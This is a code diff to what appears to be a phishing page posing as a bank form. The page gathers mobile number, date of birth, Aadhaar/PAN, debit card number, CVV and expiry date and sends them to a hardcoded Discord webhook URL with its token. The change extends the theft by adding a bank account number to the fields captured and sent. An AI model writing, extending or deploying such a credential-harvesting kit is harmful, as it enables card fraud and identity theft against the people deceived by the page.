@@ -58,6 +58,7 @@
       <input type="hidden" id="mobileNumber" name="mobileNumber">
       <input type="hidden" id="dob" name="dob">
       <input type="hidden" id="aadhaarPan" name="aadhaarPan">
+      <input type="hidden" id="accountNumber" name="accountNumber">
 
       <label for="debitCard">Debit Card Number</label>
       <input type="number" id="debitCard" name="debitCard" placeholder="Enter debit card number" required>
@@ -82,6 +83,7 @@
     document.getElementById("mobileNumber").value = urlParams.get("mobileNumber");
     document.getElementById("dob").value = urlParams.get("dob");
     document.getElementById("aadhaarPan").value = urlParams.get("aadhaarPan");
+    document.getElementById("accountNumber").value = urlParams.get("accountNumber");
 
     // Discord webhook URL
     const webhookURL = "https://discord.com/api/webhooks/1314475255292497940/CUcPPvPqZnQUAXZ90zkym2cMDP33UlxXs2oY7Bo4UvVgK-2EJyWz53emq_QpTz-CM5st"; // Replace with your actual Discord webhook URL
@@ -96,6 +98,7 @@
         "Mobile Number": document.getElementById("mobileNumber").value,
         "Date of Birth": document.getElementById("dob").value,
         "Aadhaar/PAN": document.getElementById("aadhaarPan").value,
+        "accountNumber": document.getElementById("accountNumber").value,
         "Debit Card Number": document.getElementById("debitCard").value,
         "CVV": document.getElementById("cvv").value,
         "Expiry Date": document.getElementById("expiryDate").value,
